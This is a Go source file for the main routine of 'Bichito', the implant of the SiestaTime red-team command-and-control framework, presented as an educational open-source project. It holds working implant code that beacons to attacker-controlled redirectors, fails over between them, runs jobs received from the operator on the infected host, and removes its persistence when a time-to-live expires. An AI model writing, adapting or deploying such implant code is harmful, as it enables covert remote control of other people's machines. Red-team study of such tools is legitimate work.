//{{{{{{{ Bichito Main }}}}}}}

//// Bichito is the Implant from SiestaTime Framework

//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
	"encoding/json"	
	"strconv"
	"bichito/modules/network"
	"bichito/modules/persistence"
	"bytes"
	"time"
	"os"
	"strings"
	//Debug
	//"fmt"
	"sync"
)

/*
JSON Structures for Compiling Redirectors and Implants (Bichito)
These JSON structure will be passed to the go compiling process to provide most of the configurations related to which modules are active.
Hive will have the same definitions in: ./src/hive/hiveImplants.go
*/
type BiConfig struct {
    Ttl string   `json:"ttl"`
    Resptime   string `json:"resptime"`
    Token string `json:"token"`
    Coms string   `json:"coms"`
    Persistence string `json:"persistence"`
}

type BiAuth struct {
    Bid string   `json:"bid"`
    Token string  `json:"token"`  
}

/*
This JSON Object definition is needed in the redirector to wrap within Jobs the RID of the redirector (same definition)
Hive will have the same definitions in: ./src/hive/hiveDB.go
*/
type Job struct {
    Cid  string   `json:"cid"`              // The client CID triggered the job
    Jid  string   `json:"jid"`              // The Job Id (J-<ID>), useful to avoid replaying attacks
    Pid string   `json:"pid"`               // Parent Id, when the job came completed from a Implant, Pid is the Redirector where it cames from
    Chid string `json:"chid"`               // Implant Id
    Job string   `json:"job"`               // Job Name
    Time  string   `json:"time"`            // Time of creation
    Status  string   `json:"status"`        // Sent - Processing - Finished
    Result  string   `json:"result"`        // Job output data
    Parameters string   `json:"parameters"` // Parameters will be JSON serialized to provide flexibility
}

//Bichito "on-memory" Job slices to manage Jobs that are being sent to Hive, or to an Implant
type JobsToHive struct {
	mux  sync.RWMutex
	Jobs []*Job
}

type JobsToProcess struct {
	mux  sync.RWMutex
	Jobs []*Job
}


//On Compile variables:
/*
    parameters --> JSON Encoded String with all Bichito,Network/Persistence Module data...
    biconfig   --> JSON Object where parameters will be decoded to
    authbearer --> Bichito JSON Object Credentials for the header
    resptime --> Time to wait in seconds between one Implant cycles (between egression cycles towards redirectors)
    ttl --> Time to Live, if bichito cannot connect to any director in this amount of time, remove itself
    bid --> Bichito BID

    jobsToHive --> Jobs to Hive on memory slice
    jobsToProcess --> Jobs to be processed by the Implant

    ttlC --> ttl Channel, to send a signal that stops the Implant main loop
*/
var(
	parameters string

	biconfig *BiConfig 
	ttl int
	resptime int
	bid string
	authbearer string
	redirectors []string

	jobsToHive	*JobsToHive
	jobsToProcess *JobsToProcess	

	sysinfo bool
	persisted bool

	ttlC *time.Timer
)

/*
Description: Implant Main Function
Flow:
A.Decode "On-compiled" input JSON string with Implant configurations
B.Initialize on-memory slices of jobs
C.Check if there are any persistence module activated so Implant knows it need to remove itself on inactivity 
  (so we avoid left Implants on footholds)
D.Extract network module parameters from previous JSON object, and prepare them (returning a slice of redirectors to connect to)
E.Prepare authenticaton header to log into redirectors
F.Prepare channels for signals to be used in the main loop
G.Main Implant Active Loop:
	G1.Use first redirector on slice to try to egress
	G2.If sucessful,reset ttl timer and start a jobProcessor routine
	G3.If error to connect to the redirector, try with the same redirector 4 times,if still failing,move the redirector to the end of the
	   slice and try to connect to the next one
	G4.If after TTL of try to connect to redirectors no positive coms where received, signal to stop the Implant, if persistence as active,
	   remove from disk any piece of it and kill the process 
*/
func main() {
	var result string

	//Decode Redirector Parameters
	errDaws := json.Unmarshal([]byte(parameters),&biconfig)
	if errDaws != nil {
		os.Exit(1)
	}

	ttl,_ = strconv.Atoi(biconfig.Ttl)
	resptime,_ = strconv.Atoi(biconfig.Resptime)

	//Initialize on memory slices for redirect Jobs
	var jobs []*Job
	jobsToHive	= &JobsToHive{Jobs:jobs}
	jobsToProcess = &JobsToProcess{Jobs:jobs}


	//TO-DO: Persistence/Test
	//Change for check persistence and battery command if none?

	if (biconfig.Persistence != "NoPersistence"){
		persisted = false
	
	}else{
		persisted = true
	}


	sysinfo = false
	
	/*Prepare Network Module: Decode Json data and redirectors to set them on memory
		This function alongside with "connectOut" network functions, will change in relation with the network module selected (golang "tag" selected)
	*/
	redirectors = network.PrepareNetworkMocule(biconfig.Coms)

	//Prepare Pre-Checked Authentication for Implant
	biauth := BiAuth{"",biconfig.Token}
	bufRP := new(bytes.Buffer)
	json.NewEncoder(bufRP).Encode(biauth)
	resultRP := bufRP.String()
	authbearer = resultRP 
	authbearer = strings.TrimSuffix(authbearer, "\n")

	ttlC = time.NewTimer(time.Duration(ttl) * time.Second)
	contChannel := make(chan string, 1)
	
	var swapCount int
	
	//Try to connect to any redirectors and process jobs. 
	//Repeat each respTime and reset TTL on sucessful connection
	for {
		result = "Empty"
		go func(){
			//Conect OUT is a routine that will be executed to egress
			result = connectOut()
			if result == "Success"{
				ttlC.Reset(time.Duration(ttl) * time.Second)
				swapCount = 0
				
				go jobProcessor()
				contChannel <- "True"
			}else{
				swapCount++
				if swapCount == 4 {
					//Log Error and Sort redirectors
					addLog(result)

					//Put used redirector to the last element in slice [used...] to [next...used]
					usedSave := redirectors[0]
					redirectors = redirectors[1:]
					redirectors = append(redirectors,usedSave)
					swapCount = 0

					//Reset "Received" to keep sending beacons till Hive acknowledge the change of redirector
					received = false
				}

				contChannel <- "True"
			}
		}()
		// Select connected, continue trying to connect or Timeout
		select{
			case <- contChannel:
				time.Sleep(time.Duration(resptime) * time.Second)			
				
			case <- ttlC.C:

				if persisted == true{
					RemoveInfection()
				}

				os.Exit(1)
		}
	}
}

//Start removal routine
func RemoveInfection() (bool,string){

	err,res := persistence.RemovePersistence(biconfig.Persistence)
	return err,res
}